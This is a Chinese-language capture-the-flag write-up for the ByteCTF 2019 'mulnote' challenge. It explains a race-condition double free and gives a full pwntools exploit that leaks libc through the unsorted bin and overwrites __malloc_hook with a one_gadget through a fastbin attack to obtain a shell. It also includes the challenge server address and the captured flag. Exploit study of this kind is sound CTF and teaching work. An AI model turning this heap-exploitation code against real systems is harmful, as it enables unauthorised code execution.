首发：http://blog.leanote.com/post/xp0int/%5BPWN%5D-mulnote-xfiles

```
ByteCTF 2019 mulnote
Points: 249 Solved: 49
nc 112.126.101.96 9999
```
代码有混淆，不过很容易看出是条件竞争漏洞。

释放 chunk 时使用了多线程。调用`free`函数与清空 chunk 指针之间相隔了整整10秒，能够触发 double free。

先用`unsorted bin`泄漏`libc`基地址，然后利用 fastbin attack 向`__malloc_hook`写入 one_gadget，实现 getshell。

```
# -*- coding:utf-8 -*-
from pwn import *
import time

context(log_level='debug')

p = process('./mulnote')
#p = remote("112.126.101.96", 9999)

def add(sz, ctx='\n'):
    p.sendlineafter('>', 'C')
    p.sendlineafter('>', str(sz))
    p.sendafter('>', ctx)

def free(idx):
    p.sendlineafter('>', 'R')
    p.sendlineafter('>', str(idx))

def show():
    p.sendlineafter('>', 'S')

################# Unsorted bin 泄漏 libc 地址 ######################

add(0x400) # idx: 0
free(0)
time.sleep(10) # 等待释放完成...

add(0x400) # idx: 0
show()
p.recvuntil("[0]:\n")
libc_base = u64(p.recv(6).ljust(8, '\0')) - 0x3c4b0a

######################## Fastbin Attack ############################

add(0x68) # idx:1
add(0x68) # idx:2

free(1)
time.sleep(3) # 已执行 free 函数，但还没有清空 chunk #1 的指针
free(2)
free(1)
time.sleep(10) # 等待所有的 chunk 释放完成...

fake_chunk = libc_base + 0x3c4aed

add(0x68, p64(fake_chunk))
add(0x68)
add(0x68)
one_gadget = libc_base + 0x4526a
add(0x68, 'A'*0x13 + p64(one_gadget))

p.sendlineafter('>', 'C')
p.sendlineafter('>', str(0x1234))

# bytectf{4f10583325b7a40ecd770dbb6fd54d59}
p.sendline('cat flag')

p.interactive()

```
